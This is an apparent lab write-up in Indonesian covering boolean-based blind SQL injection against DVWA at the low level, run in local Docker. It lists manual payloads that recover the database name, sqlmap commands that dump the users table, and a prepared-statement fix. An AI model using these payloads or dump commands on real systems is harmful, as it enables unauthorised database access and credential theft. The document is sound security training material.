# DVWA - Blind SQL Injection (Low) - Writeup
**Author:** Debker | **Community:** Sec-Aceh - Banda Aceh
**Date:** 29 Oct 2026

## 1. Deskripsi Vulnerability
Blind Boolean Based SQL Injection. Aplikasi hanya menampilkan dua status: `User ID exists` (TRUE) dan `User ID is MISSING` (FALSE).

## 2. Setup Lab
```bash
sudo docker run -d -p 127.0.0.1:80:80 --name dvwa vulnerables/web-dvwa

1' AND LENGTH(database())=4 # -- EXISTS (panjang 4)
1' AND LENGTH(database())=5 # -- MISSING

1' AND SUBSTRING(database(),1,1)='d' # -> EXISTS
1' AND SUBSTRING(database(),1,1)='a' # -> MISSING
1' AND SUBSTRING(database(),2,1)='v' # -> EXISTS
1' AND SUBSTRING(database(),3,1)='w' # -> EXISTS
1' AND SUBSTRING(database(),4,1)='a' # -> EXISTS

sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbs
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="..." -D dvwa --tables
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="..." -D dvwa -T users --dump

$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

sudo docker stop dvwa && sudo docker rm dvwa
